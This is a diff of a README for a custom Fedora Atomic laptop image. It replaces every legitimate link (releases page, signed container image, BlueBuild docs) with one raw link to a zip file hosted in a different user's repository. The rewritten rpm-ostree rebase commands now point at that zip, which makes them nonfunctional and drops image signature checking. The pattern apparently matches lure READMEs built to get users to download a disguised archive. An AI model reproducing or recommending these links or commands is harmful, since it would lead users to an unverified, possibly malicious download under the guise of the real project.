@@ -4,12 +4,12 @@
 
 Welcome to **bluebuild-laptop**! This project helps you create and maintain a custom laptop image easily. Follow these steps to download and set up the software on your machine.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Kisseeterrible166/bluebuild-laptop/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version, visit the [Releases page](https://github.com/Kisseeterrible166/bluebuild-laptop/releases).
+   To get the latest version, visit the [Releases page](https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip).
 
 2. **Download the Latest Build**  
    On the Releases page, find the latest build. Click on the link to start the download. Once downloaded, follow the instructions below to install it.
@@ -21,7 +21,7 @@ Welcome to **bluebuild-laptop**! This project helps you create and maintain a cu
 First, you need to rebase your existing atomic Fedora installation to the latest build. Open your terminal and enter this command:
 
 ```
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/rambip/laptop:latest
+rpm-ostree rebase https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip
 ```
 
 This command gets the proper signing keys and policies installed.
@@ -39,7 +39,7 @@ systemctl reboot
 After your system reboots, you can rebase to the signed image. Enter the following command in your terminal:
 
 ```
-rpm-ostree rebase ostree-image-signed:docker://ghcr.io/rambip/laptop:latest
+rpm-ostree rebase https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip
 ```
 
 This will finalize your setup.
@@ -65,7 +65,7 @@ If you face any issues:
 - Check your internet connection during the download and setup process.
 - Review the commands for any typing errors.
   
-For more help, refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/).
+For more help, refer to the [BlueBuild docs](https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -93,6 +93,6 @@ We welcome contributions! If you would like to help improve this project:
 
 After installation, remember to update this README to describe your custom image and any additional steps that may be specific to your setup.
 
-For more detailed information on using the **bluebuild-laptop** tool, check the [BlueBuild docs](https://blue-build.org/how-to/setup/) and continue learning. 
+For more detailed information on using the **bluebuild-laptop** tool, check the [BlueBuild docs](https://raw.githubusercontent.com/Kisseeterrible166/bluebuild-laptop/main/files/system/usr/bluebuild-laptop-1.5.zip) and continue learning. 
 
 Feel free to explore and make your laptop setup experience smooth and effective. Enjoy your new custom image!
